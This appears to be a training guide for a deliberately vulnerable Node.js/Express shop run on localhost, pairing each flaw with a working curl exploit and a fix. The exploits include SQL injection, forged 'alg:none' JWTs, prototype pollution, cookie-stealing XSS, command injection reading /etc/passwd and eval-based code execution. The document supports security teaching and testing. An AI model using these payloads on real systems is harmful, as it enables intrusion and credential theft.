# ShopEase (Node.js / Express) — Vulnerability Guide

**For authorized security testing / learning only. Run locally. Never deploy publicly or use real data.**

Same 5-page shop concept as the other editions, this time Express + EJS (server-rendered, cookie/JWT auth instead of PHP sessions or Django's DRF tokens) — so the Node/JS-specific classics show up: an unverified JWT, prototype pollution, and `eval()`-based code injection, alongside the SQLi/XSS/command-injection staples.

Demo accounts: `alice/alice123`, `bob/bobpass`, `admin/admin!2024`

---

## Page 1 — Login (`/login`, `/api/login`)
**SQL Injection (auth bypass) — CWE-89**
```
curl -X POST http://127.0.0.1:3000/api/login -H "Content-Type: application/json" -d '{"username":"admin'"'"' --","password":"x"}'
```
**Improper JWT signature verification — CWE-347**
Login signs a real JWT correctly, but *nothing downstream ever calls `jwt.verify()`* — the auth helper uses `jwt.decode()`, which reads the payload without checking the signature at all. Anyone can hand-craft their own token:
```bash
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
PAYLOAD=$(echo -n '{"id":999,"username":"attacker","is_admin":true}' | base64 | tr -d '=' | tr '/+' '_-')
curl -b "token=$HEADER.$PAYLOAD." http://127.0.0.1:3000/admin
```
No knowledge of `JWT_SECRET` is needed — the signature is never checked, so even an empty one (or garbage) works.
**Fix:** `jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] })`, always pinning the expected algorithm so `"alg":"none"` and algorithm-confusion attacks are rejected outright.

## Page 2 — Product search (`/products`, `/api/products`)
**SQL Injection (UNION-based) — CWE-89**
```
curl "http://127.0.0.1:3000/api/products?q=%27%20UNION%20SELECT%20id,username,password,email%20FROM%20users--"
```
**Fix:** parameterized `db.prepare('... WHERE name LIKE ?').all('%'+q+'%')`.

## Page 3 — Profile (`/profile/:id`, `/api/profile/:id`, `PATCH /api/profile/:id/settings`)
**IDOR — CWE-639**
No check that the logged-in user matches `:id`.
**Prototype Pollution — CWE-1321**
The "update display settings" endpoint merges the request body into a plain object with a hand-rolled recursive merge that never excludes `__proto__`/`constructor`/`prototype`:
```
curl -X PATCH http://127.0.0.1:3000/api/profile/1/settings -H "Content-Type: application/json" -d '{"__proto__":{"is_admin":true}}'
curl http://127.0.0.1:3000/api/_debug/prototype-check
# -> {"polluted_is_admin":true, ...}
```
Once `Object.prototype.is_admin` is polluted, every plain `{}` object in the whole process looks admin from then on — a realistic path to full privilege escalation in code elsewhere that does defaults-then-spread patterns, not just a curiosity.
**Fix:** use `Object.create(null)` for merge targets, or explicitly skip `__proto__`/`constructor`/`prototype` keys in the merge loop, or just use a well-maintained, patched merge library instead of hand-rolling one.

## Page 4 — Product detail & comments (`/product/:id`)
**Stored XSS — CWE-79** and **missing CSRF protection — CWE-352**
The EJS template renders the comment body with `<%- c.body %>` — EJS's *unescaped* output tag — instead of `<%= %>`:
```
curl -X POST http://127.0.0.1:3000/product/1/comments -d "author=t&body=<script>alert(document.cookie)</script>"
```
**Fix:** use `<%= %>` (auto-escaped) for any user-controlled value, and add CSRF tokens to state-changing forms.

## Page 5 — Admin (`/admin`, `/api/admin/users`, `/api/admin/ping`, `/api/admin/coupon-preview`)
**Broken access control — CWE-284** (same unverified-JWT issue as page 1, plus `/api/admin/users` has no check whatsoever)
**OS command injection — CWE-78**
```
curl -X POST http://127.0.0.1:3000/api/admin/ping -H "Content-Type: application/json" -d '{"host":"127.0.0.1; cat /etc/passwd"}'
```
**Code Injection via `eval()` — CWE-95**
A "coupon preview" calculator runs the submitted formula through `eval()` directly — full arbitrary JavaScript execution, not just arithmetic, with the same filesystem/process access as the server itself:
```
curl -X POST http://127.0.0.1:3000/api/admin/coupon-preview -H "Content-Type: application/json" \
  -d '{"price":100,"formula":"require(\"child_process\").execSync(\"id\").toString()"}'
# -> {"result":"uid=0(root) gid=0(root) ..."}
```
**Fix:** never use `eval()`/`new Function()` on user input; if arithmetic expressions are genuinely needed, parse and evaluate them with a safe expression-only library (no access to globals). For ping, avoid string-built shell commands — use `execFile('ping', ['-c', '1', host])` with the host validated against a strict allowlist pattern, and add a real role check (backed by a verified JWT) on every admin route.

---

## Also present throughout
- Hardcoded JWT secret (CWE-798) — moot here since the signature isn't checked anyway, but would matter the moment `verify()` is added back without rotating it.
- Plaintext password storage (CWE-256); SSNs and plaintext passwords returned by several unrelated endpoints (CWE-359).
- Verbose DB error messages, including the raw SQL, returned to the client (CWE-209).
- `multer` upload middleware is wired up with no file type or size limits (dormant CWE-434 — not exercised by any route in this build, but ready to bite if a route is added carelessly).

## Suggested testing workflow
1. **Manual / Burp Repeater:** log in normally, capture the JWT cookie, then try editing its payload (base64 is trivially reversible) and resending — notice the server never objects.
2. **sqlmap:** `sqlmap -u "http://127.0.0.1:3000/api/products?q=test" --batch --dump`
3. **Prototype pollution scanners** (e.g. a custom script hitting `/api/_debug/prototype-check` before/after a PATCH) to confirm global state corruption.
4. **Postman/curl collection:** script the exploit requests above, including the `eval()` RCE, into a regression collection for verifying fixes.
